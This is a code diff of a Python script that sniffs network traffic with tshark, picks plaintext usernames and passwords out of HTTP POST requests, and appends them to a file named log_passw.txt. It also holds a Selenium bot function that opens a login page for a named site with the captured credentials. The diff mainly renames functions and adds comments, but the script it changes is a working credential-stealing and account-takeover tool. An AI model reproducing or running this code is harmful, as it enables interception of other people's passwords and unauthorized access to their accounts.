@@ -1,11 +1,13 @@
-# please read test.py for current status of project
-
+# imports - standard imports
 import subprocess, re
+
+# imports - third party imports
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.ui import WebDriverWait
 
-def get_data(cmd):
+
+def __get_data__(cmd):
   # needs work ALSO CHECK: 'cmd' -a duration
   process = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True) #, universal_newlines=True
   for line in iter(process.stdout.readline, b""):
@@ -16,7 +18,8 @@ def get_data(cmd):
     else:
       return
 
-def clean_data(line):
+
+def __clean_data__(line):
   #line: input is raw data from tshark cmd
   #parser for extracting data, returns dict
   #format: {site:site-address, user:user-data, pass:pass-data}
@@ -37,7 +40,7 @@ def clean_data(line):
   return {"site":ip, "user":user, "pass":passw}
 
 
-def select_interface(tshark_path):
+def __select_interface__(tshark_path):
   interface_dict = {}
   counter = 0
 
@@ -73,7 +76,7 @@ def sniff():
 
   tshark_path = '"' + input("Enter tshark path: ") + '"' # r"C:\Program Files\Wireshark\tshark.exe"
 
-  interface = select_interface(tshark_path)
+  interface = __select_interface__(tshark_path)
   method = r" -Y http.request.method==POST "
   e_data = r" -Tfields -e http.file_data -e ip.dst -a duration:10"
   cmd = tshark_path + interface + method + e_data
@@ -82,7 +85,7 @@ def sniff():
 
   while True:
     #print(get_data(cmd))
-    data_read = get_data(cmd)
+    data_read = __get_data__(cmd)
     try:
       print(data_read)
       with open("log_passw.txt","a") as f:
@@ -91,7 +94,9 @@ def sniff():
     except TypeError:
       pass
 
+
 def bot(ussr,passw):
+  # special function made upon request
   url = r"http://findfriendz.com/login.php"
   browser = webdriver.Chrome("chromedriver.exe")
   browser.get(url)
